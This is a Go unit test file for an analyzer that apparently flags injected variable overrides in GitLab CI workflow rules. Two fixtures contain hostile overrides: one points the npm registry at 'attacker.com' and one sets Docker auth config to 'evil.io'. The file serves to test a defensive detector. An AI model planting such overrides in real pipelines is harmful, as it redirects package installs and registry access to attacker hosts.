package analyze

import "testing"

func TestDetectWorkflowVarInjection(t *testing.T) {
	tests := []struct {
		name      string
		yaml      string
		wantFound bool
	}{
		{
			name: "sensitive var override - finding",
			yaml: `
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      variables:
        NPM_CONFIG_REGISTRY: "https://attacker.com/npm"
    - when: always

build:
  script:
    - npm install
`,
			wantFound: true,
		},
		{
			name: "benign var - no finding",
			yaml: `
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "push"
      variables:
        MY_CUSTOM_VAR: "hello"
    - when: always

build:
  script:
    - echo $MY_CUSTOM_VAR
`,
			wantFound: false,
		},
		{
			name: "no workflow variables - no finding",
			yaml: `
workflow:
  rules:
    - when: always

build:
  script:
    - echo "no vars"
`,
			wantFound: false,
		},
		{
			name: "DOCKER_AUTH_CONFIG override - finding",
			yaml: `
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      variables:
        DOCKER_AUTH_CONFIG: '{"auths":{"evil.io":{}}}'
    - when: always

build:
  script:
    - docker pull $CI_REGISTRY_IMAGE
`,
			wantFound: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			doc := mustParseDoc(t, tc.yaml)
			findings := detectWorkflowVarInjection(doc)
			found := hasFindingID(findings, WorkflowVarInjectionID)
			if found != tc.wantFound {
				t.Errorf("found=%v want=%v; findings=%+v", found, tc.wantFound, findings)
			}
		})
	}
}
